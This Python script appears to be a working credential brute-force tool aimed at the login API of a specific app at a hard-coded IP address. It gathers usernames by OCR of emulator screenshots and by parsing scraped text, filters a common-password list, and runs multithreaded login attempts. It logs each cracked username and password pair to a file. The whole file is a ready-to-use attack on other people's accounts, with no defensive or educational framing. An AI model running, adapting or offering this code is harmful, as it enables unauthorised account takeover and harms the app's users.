
import base64
import json
import os
import threading
import time
import binascii

import requests

from extract_text import get_text, easy_ocr

_mutex = threading.Lock()
def hex_test():
    s = "String"
    # 字符串变字符型字节流
    s_byte = s.encode()
    # 字符型字节流转十六进制字节流, 与b2a_hex()，bytes.hex()方法功能一样
    s_hex = binascii.hexlify(s_byte)
    print("s_byte:%s\ns_hex:%s" % (s_byte, s_hex))

def get_login_res(user, password):
    en_password = base64.b64encode(password.encode('utf-8')).decode('utf-8')
    en_user = base64.b64encode(user.encode('utf-8')).decode('utf-8')
    # print("en_user:%s %s  password:%s %s" % (user, en_user, password, en_password))
    url = 'http://46.51.252.220:82/api/login?a=n&v=1.26.0&u_c=unknown&cl_t=fantasy&p_e=%s&fm=bin&e_e=%s' % (en_password, en_user)
    # print("url:%s" % url)
    # data = {
    #     "cv": "399",
    #     "pay_k": "cn_1",
    #     "model": "V1938CT",
    #     "cou_c": "CN",
    #     "lang_c": "zh",
    #     "vt": "1",
    #     "devi_id": "010045028712612",
    #     "an_id": "71e2d225381dbc98",
    #     "net_t": 1,
    #     "cr_v": "1",
    #     "finger_p": int(time.time() * 100)
    # }
    data = {}
    headers = {'Content-Type': 'text/plain;charset=UTF-8'}
    response = requests.post(url, data=json.dumps(data), headers=headers)
    return response.content.__sizeof__() > 1000


def get_user():
    count = 0
    path = "C:/Users/24349/Documents/leidian/Pictures0604_2"
    easy_ocr(path)

def get_password():
    with open("text/new_common_passord.txt", 'a', encoding='utf-8') as writer:
        with open("common_passord.txt", encoding='utf-8') as lines:
            for line in lines:
                if len(line.strip()) >= 6:
                    writer.write(line.strip() + '\n')



def log_with_pass_file(user):
    pass_file = "common_passord.txt"
    retry_time = 3
    with open(pass_file, encoding='utf-8') as lines:
        for pass_word in lines:
            pass_word = pass_word.strip()
            for i in range(retry_time):
                login_result = get_login_res(user, pass_word)
                if login_result:
                    with open("success_user.txt", 'a', encoding='utf-8') as writer:
                        writer.write("%s\t%s\n" % (user, pass_word))
                        print("log_sucess")
                        print("%s\t%s\n" % (user, pass_word))
                        return

def thread_load(index, user_list):
    print("thread %s start" % index)
    while True:
        _mutex.acquire()
        try:
            user = user_list.pop()
        except Exception as e:
            print(e)
            print("thread %s finish" % index)
            break
        finally:
            _mutex.release()
        print("start try_login %s" % user)
        try:
            log_with_pass_file(user.strip())
        except Exception as e:
            print("error%s" % e)


    pass

def get_user_list(file_name):
    user_list = []
    with open(file_name) as lines:
        for user in lines:
            user_list.append(user.strip())
    return user_list

def get_user_by_attact(file_name):
    user_list = set()
    name_flag = False
    with open(file_name) as lines:
        for line in lines:
            if name_flag:
                user_list.add(line.strip() + '\n')
                name_flag = False
            if "距离" in line:
                name_flag = True
                continue
    with open("user_dict/user_1355.txt", 'a') as writer:
        writer.writelines(user_list)




def test():
    # user = "请叫我情兽"
    # password = "123456"
    # login_result = get_login_res(user, password)
    # print(login_result)
    get_user()
    # get_user_by_attact("text/result1355.txt")
    # get_password()
    # qu_chong()

    # user_list = get_user_list("user_1355.txt")
    # threads = []
    # max_thread_num = 20
    # for x in range(0, max_thread_num):
    #     name = 'login-thread_%s' % x
    #     threads.append(threading.Thread(
    #         target=thread_load, args=(x, user_list), name=name))
    # for t in threads:
    #     t.start()
    # for t in threads:
    #     t.join()


    pass




def qu_chong():

    user_set = set()
    with open("result.txt") as lines:
        for user in lines:
            user = user.strip()
            user_set.add(user + '\n')

    with open("user_dict/user.txt", 'w') as writer:
        writer.writelines(user_set)

if __name__ == "__main__":
    print("start try_password")
    test()
